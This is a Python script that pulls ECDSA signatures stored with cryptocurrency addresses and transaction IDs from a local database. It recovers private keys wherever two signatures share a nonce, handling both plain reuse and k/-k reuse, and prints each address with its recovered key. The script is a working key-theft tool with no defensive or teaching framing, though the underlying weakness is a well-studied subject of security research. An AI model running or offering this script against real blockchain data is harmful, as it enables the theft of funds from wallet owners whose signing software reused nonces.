import sqlite3

def solve_reuse():
    conn = sqlite3.connect('cryscout.db')
    cur = conn.cursor()
    P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    
    cur.execute('SELECT r_hex, s_hex, z_hex, address, txid FROM signatures')
    rows = cur.fetchall()
    
    r_map = {}
    for r_hex, s_hex, z_hex, addr, txid in rows:
        r = int(r_hex, 16)
        if r not in r_map: r_map[r] = []
        r_map[r].append({'s': int(s_hex, 16), 'z': int(z_hex, 16), 'addr': addr, 'txid': txid})
        
    for r, sigs in r_map.items():
        if len(sigs) < 2: continue
        
        # Check all pairs
        for i in range(len(sigs)):
            for j in range(i + 1, len(sigs)):
                s1, z1 = sigs[i]['s'], sigs[i]['z']
                s2, z2 = sigs[j]['s'], sigs[j]['z']
                
                if s1 == s2 and z1 == z2: continue
                
                # Check for k reuse: k = (z1 - z2) / (s1 - s2)
                if s1 != s2:
                    k = ((z1 - z2) * pow(s1 - s2, -1, P)) % P
                    d = ((s1 * k - z1) * pow(r, -1, P)) % P
                    if d != 0:
                        print(f"!!! RECOVERY SUCCESS (k reuse) !!!")
                        print(f"Address: {sigs[i]['addr']}")
                        print(f"Private Key: {hex(d)}")
                        return d
                
                # Check for k, -k reuse:
                # s1 = (z1 + r*d) / k
                # s2 = (z2 - r*d) / k
                # k*s1 = z1 + r*d
                # k*s2 = z2 - r*d
                # k(s1 + s2) = z1 + z2
                k = ((z1 + z2) * pow(s1 + s2, -1, P)) % P
                d = ((s1 * k - z1) * pow(r, -1, P)) % P
                if d != 0:
                    print(f"!!! RECOVERY SUCCESS (k, -k reuse) !!!")
                    print(f"Address: {sigs[i]['addr']}")
                    print(f"Private Key: {hex(d)}")
                    return d

    print("No solvable R-reuse found.")
    return None

if __name__ == "__main__":
    solve_reuse()
